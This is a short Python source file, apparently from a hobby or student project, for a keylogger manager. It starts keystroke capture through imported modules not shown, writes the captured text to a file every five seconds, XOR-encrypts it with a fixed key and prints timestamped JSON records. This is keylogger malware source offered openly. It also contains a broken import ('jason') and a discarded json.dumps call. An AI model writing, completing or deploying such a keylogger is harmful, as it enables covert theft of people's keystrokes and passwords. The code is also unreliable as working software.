from abc import ABC, abstractmethod
from keyloggeragent import KeyLoggerService
from keyloggerfilewriter import FileWriter
import jason
from keyloggeragent import Encryptor

class KeyLoggerManager(FileWriter,KeyLoggerService):
    def __init__(self):
        super().__init__()

    def start(self):
            from datetime import datetime
            import time
            import json
            writing_to_a_file = FileWriter()
            self.start_logging()
            self.Encryption = Encryptor()
            while True:
                    writing_to_a_file.send_data(self.text,'l')
                    start_time = str(datetime.now())
                    time.sleep(5)
                    
                    end_time = str(datetime.now())
                    jeson = {'start time':start_time,'data':self.Encryption.encryption_using_xor(str(self.text),4),'end time':end_time}
                    json.dumps(jeson,ensure_ascii=False)
                    print(jeson)
                    self.text.clear()
                    
                    
                    
                
c = KeyLoggerManager()
c.start()